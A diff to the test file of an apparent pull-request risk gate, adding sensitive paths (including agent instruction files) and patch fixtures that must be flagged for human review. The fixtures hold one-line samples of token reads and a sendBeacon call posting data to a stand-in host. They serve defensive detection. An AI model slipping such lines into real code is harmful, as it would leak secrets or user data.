@@ -238,6 +238,9 @@ test('sensitive paths require human head-bound approval plus independent review'
     'scripts/ops/prod-db.mjs',
     'nuxt.config.ts',
     'workers/contract-tests/client.ts',
+    'CLAUDE.md',
+    'app/features/CLAUDE.md',
+    'code_review.md',
     'unknown/file.js',
   ]) {
     const f = fixture();
@@ -250,14 +253,77 @@ test('sensitive paths require human head-bound approval plus independent review'
 test('renamed paths, large patches and hidden credential operations remain sensitive', () => {
   for (const change of [
     { previous_filename: 'app/pages/account.vue' },
-    { changes: 201 },
+    { changes: 501 },
     { patch: '+localStorage.setItem()' },
     { patch: '+fetch(url)' },
+    { filename: 'app/composables/useThing.ts', patch: '+const t = process.env.TOKEN' },
+    { filename: 'app/stores/useProgressStore.ts' },
+    { filename: 'app/utils/guard.ts', patch: '-if (!session) throw new Error()' },
+    { patch: "+navigator.sendBeacon('https://example.invalid', body)" },
+    { patch: '+new WebSocket(url)' },
+    { filename: 'app/server/api/thing.get.ts' },
+    { filename: 'app/plugins/thing.client.ts' },
   ]) {
     const f = fixture();
     Object.assign(f.files[0], change);
-    assert.throws(() => admissionDecision(f));
+    assert.throws(() => admissionDecision(f), JSON.stringify(change));
   }
+});
+test('network context, callable references and mixed helpers keep sensitive approval', () => {
+  for (const change of [
+    { patch: ' fetch(\n-  oldEndpoint,\n+  newEndpoint,\n   options\n )' },
+    { patch: '+fetch (endpoint)' },
+    { patch: '+fetch?.(endpoint)' },
+    { patch: '+fetch<Response>(endpoint)' },
+    { patch: '+tarkovApiFetch<FetchResponse<T>>(query)' },
+    { patch: '+const send = fetch;\n+send(endpoint)' },
+    { patch: '+send("https://example.invalid")' },
+    { patch: ' if (!session) return;\n-apply(oldValue);\n+apply(newValue);' },
+    { patch: '+++ session.retries;' },
+    { patch: '--- session.retries;' },
+    { filename: 'app/utils/profileVisibility.ts', patch: "-.eq('user_id', userId)\n+.limit(100)" },
+    { filename: 'app/composables/useAppInitialization.ts', patch: '-if (staleUser) return;' },
+    { filename: 'app/stores/useUiStore.ts', patch: '+const state = ref()' },
+  ]) {
+    const f = fixture();
+    Object.assign(f.files[0], change);
+    assert.equal(classifyRisk(f.files).sensitive, true, JSON.stringify(change));
+    assert.throws(() => admissionDecision(f), JSON.stringify(change));
+    f.reviews.push(human());
+    assert.equal(admissionDecision(f).risk, 'sensitive', JSON.stringify(change));
+  }
+});
+test('ordinary UI code and review-only volume stay low risk', () => {
+  for (const files of [
+    [{ filename: 'app/components/StatusTone.vue', changes: 15, patch: '-a\n+b' }],
+    [{ filename: 'DESIGN.md', changes: 5, patch: '+See https://example.com' }],
+    [
+      {
+        filename: 'app/features/tasks/TaskCard.vue',
+        changes: 2,
+        patch: ' const existingStyle = "green"\n+const x = 1',
+      },
+    ],
+    [
+      { filename: 'app/components/ui/StatusTabBar.vue', changes: 300, patch: '+<div />' },
+      { filename: 'app/components/ui/__tests__/helpers.ts', changes: 400, patch: '+const x = 1' },
+    ],
+    [
+      { filename: 'app/components/ui/StatusTabBar.vue', changes: 300, patch: '+<div />' },
+      {
+        filename: 'app/components/ui/__tests__/StatusTabBar.test.ts',
+        changes: 400,
+        patch: '+it()',
+      },
+    ],
+  ]) {
+    assert.equal(classifyRisk(files).sensitive, false, files[0].filename);
+  }
+  assert.equal(
+    classifyRisk([{ filename: 'app/components/A.vue', changes: 501, patch: '+<div />' }]).sensitive,
+    true
+  );
+  assert.equal(classifyRisk([{ filename: 'AGENTS.md', changes: 1, patch: '+x' }]).sensitive, true);
 });
 test('explicit sensitive command authenticates permission and immutable SHA', () => {
   const f = fixture();
